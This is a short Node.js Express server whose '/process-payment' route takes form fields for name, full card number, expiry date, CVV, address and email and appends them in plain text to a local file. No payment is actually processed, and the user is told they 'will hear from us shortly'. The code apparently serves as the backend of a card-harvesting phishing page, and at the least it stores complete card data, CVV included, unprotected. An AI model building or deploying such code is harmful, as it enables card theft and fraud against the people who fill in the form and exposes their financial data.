const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000; // You can change the port if you prefer

app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/process-payment', (req, res) => {
    const paymentInfo = req.body;
    const data = `First Name: ${paymentInfo.firstName}\n` +
                 `Last Name: ${paymentInfo.lastName}\n` +
                 `Card Number: ${paymentInfo.cardNumber}\n` +
                 `Expiration Date: ${paymentInfo.expDate}\n` +
                 `CVV: ${paymentInfo.cvv}\n` +
                 `Post Code: ${paymentInfo.postcode}\n` +
                 `Street Address: ${paymentInfo.streetAddress}\n` +
                 `State: ${paymentInfo.state}\n` +
                 `Country: ${paymentInfo.country}\n` +
                 `Email Address: ${paymentInfo.email}\n\n`;

    fs.appendFile('payment-info.txt', data, (err) => {
        if (err) throw err;
        console.log('Payment information saved!');
    });

    // You can send a response back to the client if needed
    res.send('Thanks for info, you will hear from us shortly!');
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
